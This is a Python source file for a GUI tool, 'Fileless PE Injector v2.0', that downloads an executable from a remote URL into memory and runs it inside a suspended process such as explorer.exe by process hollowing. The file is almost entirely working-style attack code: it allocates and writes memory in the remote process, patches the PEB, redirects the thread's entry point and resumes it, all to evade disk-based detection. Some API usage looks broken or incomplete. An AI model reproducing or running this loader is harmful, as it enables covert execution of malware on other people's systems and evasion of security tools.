import ctypes, struct, urllib.request, io, tkinter as tk
from tkinter import ttk, messagebox
from ctypes import wintypes

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
IMAGE_NT_HEADERS = 0x4550

k32 = ctypes.WinDLL('kernel32', use_last_error=True)
nt = ctypes.WinDLL('ntdll', use_last_error=True)

class ProcessHollowingInjector:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Fileless PE Injector v2.0")
        self.root.geometry("600x500")
        
        # GUI Components
        ttk.Label(self.root, text="Remote PE URL:").pack(pady=5)
        self.pe_url = ttk.Entry(self.root, width=70)
        self.pe_url.pack(pady=5)
        self.pe_url.insert(0, "https://github.com/username/pefile/raw/main/payload.exe")
        
        ttk.Label(self.root, text="Target Process (ex: explorer.exe):").pack(pady=5)
        self.target_proc = ttk.Entry(self.root, width=30)
        self.target_proc.pack(pady=5)
        self.target_proc.insert(0, "explorer.exe")
        
        ttk.Button(self.root, text="Inject Fileless PE", 
                  command=self.execute_injection).pack(pady=20)
        
        self.status = ttk.Label(self.root, text="Status: Ready")
        self.status.pack(pady=10)
        
        # Log display
        self.log = tk.Text(self.root, height=15, width=70)
        self.log.pack(pady=10)
        self.log.insert('1.0', "Fileless injection log:\n")
    
    def log_message(self, msg):
        self.log.insert('end', f"{msg}\n")
        self.root.update()
    
    def download_pe(self, url):
        """Download PE file into memory without touching disk"""
        self.log_message(f"[+] Downloading PE from: {url}")
        try:
            with urllib.request.urlopen(url) as response:
                pe_data = bytearray(response.read())
                self.log_message(f"[+] Downloaded {len(pe_data)} bytes")
                return pe_data
        except Exception as e:
            messagebox.showerror("Error", f"Download failed: {e}")
            return None
    
    def inject_pe(self, pe_data, target_process):
        """Process hollowing implementation for GUI EXEs"""
        # Step 1: Create suspended target process
        si = wintypes.STARTUPINFO()
        pi = wintypes.PROCESS_INFORMATION()
        
        self.log_message(f"[+] Creating suspended process: {target_process}")
        if not k32.CreateProcessW(None, target_process, None, None, False,
                                 0x4, None, None, ctypes.byref(si), ctypes.byref(pi)):
            self.log_message("[-] Failed to create process")
            return False
        
        # Step 2: Parse PE headers
        pe_offset = struct.unpack('<I', pe_data[60:64])[0]
        image_base_offset = pe_offset + 24
        image_base = struct.unpack('<Q', pe_data[image_base_offset:image_base_offset+8])[0]
        
        # Step 3: Unmap original process memory
        pbi = (ctypes.c_ubyte * 0x48)()
        nt.NtQueryInformationProcess(pi.hProcess, 0, ctypes.byref(pbi), 0x48, None)
        
        # Step 4: Allocate new memory in target process
        size_of_image = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
        self.log_message(f"[+] Allocating {size_of_image} bytes in target")
        
        alloc_base = k32.VirtualAllocEx(pi.hProcess, image_base, size_of_image,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        
        if not alloc_base:
            alloc_base = k32.VirtualAllocEx(pi.hProcess, 0, size_of_image,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        
        # Step 5: Write PE headers
        written = wintypes.SIZE_T()
        k32.WriteProcessMemory(pi.hProcess, alloc_base, pe_data, 0x1000, ctypes.byref(written))
        
        # Step 6: Write PE sections
        num_sections = struct.unpack('<H', pe_data[pe_offset+6:pe_offset+8])[0]
        section_offset = pe_offset + 248
        
        for i in range(num_sections):
            section = pe_data[section_offset + i*40:section_offset + (i+1)*40]
            va = struct.unpack('<I', section[12:16])[0]
            size = struct.unpack('<I', section[16:20])[0]
            raw = struct.unpack('<I', section[20:24])[0]
            
            if size > 0:
                k32.WriteProcessMemory(pi.hProcess, alloc_base + va,
                                      pe_data[raw:raw+size], size, ctypes.byref(written))
        
        # Step 7: Fix base address in PEB
        context = (ctypes.c_ubyte * 0x4D0)()
        context[0] = 0x10
        nt.NtGetContextThread(pi.hThread, context)
        
        rdx = context[0xA0:0xA8]
        peb_base = struct.unpack('<Q', rdx)[0] + 0x10
        
        k32.WriteProcessMemory(pi.hProcess, peb_base,
                              struct.pack('<Q', alloc_base), 8, ctypes.byref(written))
        
        # Step 8: Set entry point and resume
        entry_point = alloc_base + struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
        context[0x80:0x88] = struct.pack('<Q', entry_point)
        nt.NtSetContextThread(pi.hThread, context)
        
        self.log_message("[+] Resuming thread...")
        k32.ResumeThread(pi.hThread)
        
        k32.CloseHandle(pi.hThread)
        k32.CloseHandle(pi.hProcess)
        
        return True
    
    def execute_injection(self):
        """Main execution flow"""
        pe_url = self.pe_url.get()
        target = self.target_proc.get()
        
        self.log_message(f"\n[+] Starting fileless injection")
        self.log_message(f"[+] Target: {target}")
        
        # Download PE
        pe_data = self.download_pe(pe_url)
        if not pe_data:
            return
        
        # Verify PE
        if pe_data[:2] != b'MZ':
            messagebox.showerror("Error", "Invalid PE file")
            return
        
        # Inject
        if self.inject_pe(pe_data, target):
            self.log_message("[+] Injection successful!")
            self.status.config(text="Status: Injected")
            messagebox.showinfo("Success", "GUI EXE injected filelessly")
        else:
            self.log_message("[-] Injection failed")
            self.status.config(text="Status: Failed")

# Run the injector
if __name__ == "__main__":
    app = ProcessHollowingInjector()
    app.root.mainloop()